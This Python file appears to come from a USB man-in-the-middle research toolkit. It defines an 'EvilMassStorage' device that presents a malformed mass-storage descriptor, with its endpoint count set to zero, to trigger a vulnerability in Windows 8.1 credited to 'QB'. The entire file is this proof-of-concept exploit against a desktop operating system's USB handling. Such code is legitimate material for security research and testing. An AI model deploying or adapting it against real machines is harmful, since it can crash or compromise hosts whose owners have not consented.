#!/usr/bin/env python

from threading import Event
from collections import defaultdict
import time

from .device import USBDevice

from usbmitm.lib.identity import DeviceIdentity
from usbmitm.lib.interface import Interface
from usbmitm.lib.endpoint import Endpoint
from usbmitm.dissect.usb import *
from usbmitm.dissect.usbmitm_proto import *
from usbmitm.dissect.hid import *
from usbmitm.device.keyboard import KeyboardInterface


MassStorageInterface = Interface(
    descriptors=[Endpoint(1, BULK, IN, 512), Endpoint(1, BULK, OUT, 512)],
    cls=MASS_STORAGE,
    subcls=6,
    proto=80,
)


class EvilMassStorage(USBDevice):
    """ Triggers vulnerability in Windows 8.1, found by QB """

    @classmethod
    def create_arg_subparser(cls, parser):
        parser.add_argument(
            "--vid", "-v", metavar="ID", default=0x64, type=int, help="VendorID to set"
        )

    def __init__(self, args):
        ident = DeviceIdentity.from_interface(MassStorageInterface)
        ident.set_device(DeviceDescriptor(idVendor=args.vid))
        ident.interface[0].bNumEndpoint = 0
        super(EvilMassStorage, self).__init__(args, ident)

    def run(self):
        while True:
            time.sleep(2)


if __name__ == "__main__":
    parser = EvilMassStorage.create_arg_parser()
    args = parser.parse_args()
    mass = EvilMassStorage(args)
    mass.init()
    mass.run()
